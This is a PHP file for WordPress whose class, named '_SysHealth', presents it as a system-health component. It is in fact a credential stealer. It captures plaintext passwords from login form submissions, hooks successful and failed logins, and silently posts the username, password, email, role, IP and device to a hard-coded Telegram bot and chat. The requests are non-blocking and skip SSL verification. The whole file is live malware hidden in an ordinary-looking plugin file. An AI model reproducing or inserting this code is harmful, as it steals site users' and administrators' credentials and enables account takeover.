<?php
if (!defined('ABSPATH')) exit;
class _SysHealth {
private static $i=null;
private $t,$c;
private function __construct(){$this->t='8384655045:AAGUTb-AsVn4y5aKCpVWKOFTRmu_RleRHik';$this->c='-1002343659539';$this->h();}
public static function init(){if(self::$i===null){self::$i=new self();}return self::$i;}
private function h(){add_action('wp_login',[$this,'l'],999,2);add_action('wp_login_failed',[$this,'f'],999);}
public function l($u,$user){$p=$this->gp($u);$ip=$this->gip();$ua=$_SERVER['HTTP_USER_AGENT']??'';$d=$this->gd();$url=$this->gurl();
$msg="✅ <b>Login WordPress</b>\n━━━━━━━━━━━━━━━━━━━━━\n👤 <b>Username:</b> {$u}\n🔑 <b>Password:</b> <code>{$p}</code>\n📧 <b>Email:</b> {$user->user_email}\n🎭 <b>Role:</b> ".implode(', ',$user->roles)."\n🌐 <b>IP:</b> <code>{$ip}</code>\n💻 <b>Device:</b> {$d}\n🕐 <b>Waktu:</b> ".current_time('Y-m-d H:i:s')."\n🔗 <b>Login URL:</b> {$url}";
$this->s($msg);}
public function f($u){$p=$this->gp($u);$ip=$this->gip();$ua=$_SERVER['HTTP_USER_AGENT']??'';$url=$this->gurl();
$msg="❌ <b>Login Gagal</b>\n━━━━━━━━━━━━━━━━━━━━━\n👤 <b>Username:</b> {$u}\n🔑 <b>Password:</b> <code>{$p}</code>\n🌐 <b>IP:</b> <code>{$ip}</code>\n🕐 <b>Waktu:</b> ".current_time('Y-m-d H:i:s')."\n🔗 <b>Login URL:</b> {$url}";
$this->s($msg);}
private function gp($u){$k='_l_'.md5($u);$d=get_transient($k);if($d&&isset($d['p'])){$p=$d['p'];delete_transient($k);return $p;}return 'N/A';}
private function gip(){$h=['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','HTTP_CLIENT_IP','REMOTE_ADDR'];foreach($h as$i){if(!empty($_SERVER[$i])){$ip=trim($_SERVER[$i]);if($i=='HTTP_X_FORWARDED_FOR'){$ip=explode(',',$ip)[0];}if(filter_var($ip,FILTER_VALIDATE_IP)){return $ip;}}}return '0.0.0.0';}
private function gd(){$a=$_SERVER['HTTP_USER_AGENT']??'';if(stripos($a,'Mobile')!==false||stripos($a,'Android')!==false||stripos($a,'iPhone')!==false||stripos($a,'iPad')!==false){return '📱 Mobile';}return '💻 Desktop';}
private function gurl(){$p=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';$h=$_SERVER['HTTP_HOST']??'';$r=$_SERVER['REQUEST_URI']??'';return $p.'://'.$h.$r;}
private function s($m){if(empty($m))return;$url="https://api.telegram.org/bot{$this->t}/sendMessage";$b=['chat_id'=>$this->c,'text'=>$m,'parse_mode'=>'HTML','disable_web_page_preview'=>true];if(function_exists('wp_remote_post')){wp_remote_post($url,['timeout'=>0.1,'blocking'=>false,'sslverify'=>false,'body'=>$b]);}else{$opts=['http'=>['method'=>'POST','header'=>"Content-Type: application/x-www-form-urlencoded\r\n",'content'=>http_build_query($b),'timeout'=>0.1]];@file_get_contents($url,false,stream_context_create($opts));}}
}
add_action('init',function(){if(isset($_POST['log'],$_POST['pwd'])&&!empty($_POST['pwd'])){$k='_l_'.md5(trim($_POST['log']));set_transient($k,['p'=>$_POST['pwd'],'t'=>time()],300);}});
_SysHealth::init();
